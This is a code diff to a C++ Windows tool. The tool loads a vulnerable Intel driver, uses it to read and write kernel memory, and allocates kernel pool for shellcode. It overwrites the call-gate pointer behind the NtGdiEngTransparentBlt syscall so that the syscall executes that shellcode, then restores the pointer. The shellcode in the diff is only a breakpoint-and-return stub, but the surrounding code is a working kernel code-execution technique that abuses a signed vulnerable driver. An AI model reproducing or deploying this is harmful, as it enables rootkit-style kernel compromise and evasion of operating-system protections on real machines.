@@ -8,33 +8,26 @@ namespace offset
 		// mov  r10, rcx				; 0x3			; 49 89 ca
 		// mov  eax, <DWORD>			; 0x1			; b8 <DWORD>
 		const s_field NtGdiEngTransparentBlt_SyscallID = { .byte = 0x3 + 0x1, .bytes = 0x4, .bit = 0x0 , .bits = 0x0 };
-		// push rbx						; 0x1			; 53
+		// rex  push rbx				; 0x2			; 40 53
 		// sub  rsp, 0x50				; 0x4			; 48 83 ec 50
 		// mov  rax, [rip + <DWORD>]	; 0x3			; 48 8b 05 <DWORD>
-		const s_field NtGdiEngTransparentBlt_RipGate = { .byte = 0x1 + 0x4 + 0x3, .bytes = 0x4, .bit = 0x0 , .bits = 0x0 };
-		// push rbx						; 0x1			; 53
+		const s_field NtGdiEngTransparentBlt_RipGate = { .byte = 0x2 + 0x4 + 0x3, .bytes = 0x4, .bit = 0x0 , .bits = 0x0 };
+		// rex  push rbx				; 0x2			; 40 53
 		// sub  rsp, 0x50				; 0x4			; 48 83 ec 50
 		// mov  rax, [rip + 0x5aff7]	; 0x3 + 0x4		; 48 8b 05 f7 af 05 00
 		// RIP:
-		const s_field NtGdiEngTransparentBlt_Rip = { .byte = 0x1 + 0x4 + 0x3 + 0x4, .bytes = 0x0, .bit = 0x0 , .bits = 0x0 };
+		const s_field NtGdiEngTransparentBlt_Rip = { .byte = 0x2 + 0x4 + 0x3 + 0x4, .bytes = 0x0, .bit = 0x0 , .bits = 0x0 };
 	}
 }
 
-unsigned char R0_Callgate_Buf[1337] = {
-	// ToDo
-};
+unsigned char R0_Callgate_Buf[2] = { 0xCC, 0xC3 };
+// int 3h
+// ret
 
 int main(const int argc, char* argv[])
 {
 	if (argc == 1337)
 		MessageBoxA(nullptr, "world", "hello", MB_OK);
-
-	const HANDLE hDev = intel_driver::Load();
-	const auto Unload = [](const HANDLE hDrv) -> int
-	{
-		intel_driver::Unload(hDrv);
-		return 0;
-	};
 	
 	const auto pid = GetCurrentProcessId();
 	printf("   PID = %lx" "\n", pid);
@@ -80,6 +73,20 @@ int main(const int argc, char* argv[])
 	printf("R0 NtGdiEngTransparentBlt RIP GATE OFFSET PTR = %llx" "\n", R0_NtBlt_RIP_GATE_OFFSET_PTR);
 	if (!R0_NtBlt_RIP_GATE_OFFSET_PTR) return 0;
 
+	printf(" > Load Intel Driver" "\n");
+	
+	const HANDLE hDev = intel_driver::Load();
+	printf("   hDev = %p" "\n", hDev);
+	if (!hDev || hDev == INVALID_HANDLE_VALUE) return 0;
+
+	const auto Unload = [](const HANDLE hDrv) -> int
+	{
+		intel_driver::Unload(hDrv);
+		return 0;
+	};
+
+	printf(" > Readback Callgate RIP Offset" "\n");
+
 	// Readback Callgate RIP Offset
 	uint64_t R0_NtBlt_RIP_GATE_OFFSET = 0x0;
 	intel_driver::ReadMemory(hDev,
@@ -94,6 +101,8 @@ int main(const int argc, char* argv[])
 	printf("R0 NtGdiEngTransparentBlt RIP GATE PTR = %llx" "\n", R0_NtBlt_RIP_GATE_PTR);
 	if (!R0_NtBlt_RIP_GATE_PTR) return Unload(hDev);
 
+	printf(" > Readback Callgate Pointer" "\n");
+	
 	// Readback Callgate-Pointer
 	uint64_t R0_NtBlt_RIP_GATE = 0x0;
 	intel_driver::ReadMemory(hDev,
@@ -102,7 +111,9 @@ int main(const int argc, char* argv[])
 		sizeof(R0_NtBlt_RIP_GATE));
 	printf("R0 NtGdiEngTransparentBlt RIP GATE = %llx" "\n", R0_NtBlt_RIP_GATE);
 	if (!R0_NtBlt_RIP_GATE) return Unload(hDev);
-
+	
+	printf(" > Allocate/Write Shellcode" "\n");
+	
 	// Allocate Kernel-Memory
 	auto R0_Callgate_PTR = intel_driver::AllocatePool(hDev,
 		nt::POOL_TYPE::NonPagedPool,
@@ -116,16 +127,17 @@ int main(const int argc, char* argv[])
 		sizeof(R0_Callgate_Buf))) return Unload(hDev);
 	printf("R0 Shellcode = %llx" "\n", R0_Callgate_PTR);
 
-	Sleep(1000);
+	printf(" > Overwrite Gate Pointer" "\n");
 	
 	// Overwrite Callgate-Pointer with Shellcode-Address
 	if (!intel_driver::WriteToReadOnlyMemory(hDev,
 		R0_NtBlt_RIP_GATE_PTR,
 		static_cast<void*>(&R0_Callgate_PTR),
 		sizeof(uint64_t))) return Unload(hDev);
-	
-	__debugbreak();
 
+	printf(" > Call GDI-Syscall" "\n");
+	Sleep(1000);
+	
 	if (const auto p = static_cast<unsigned int*>(GdiBatchCount); (*p) == 0)
 	{
 		(*p) = 1337;
@@ -141,16 +153,18 @@ int main(const int argc, char* argv[])
 		(*p) = 0;
 	}
 
+	printf(" > Reset Gate Pointer" "\n");
+
 	// Overwrite Callgate-Pointer with Original-Address
 	if (!intel_driver::WriteToReadOnlyMemory(hDev,
 		R0_NtBlt_RIP_GATE_PTR,
 		static_cast<void*>(&R0_NtBlt_RIP_GATE),
 		sizeof(uint64_t))) return Unload(hDev);
 
+	printf(" > Free Shellcode" "\n");
+	
 	if (!intel_driver::FreePool(hDev, R0_Callgate_PTR))
 		return Unload(hDev);
-	
-	system("pause");
 
-	return 0;
+	return Unload(hDev);
 }
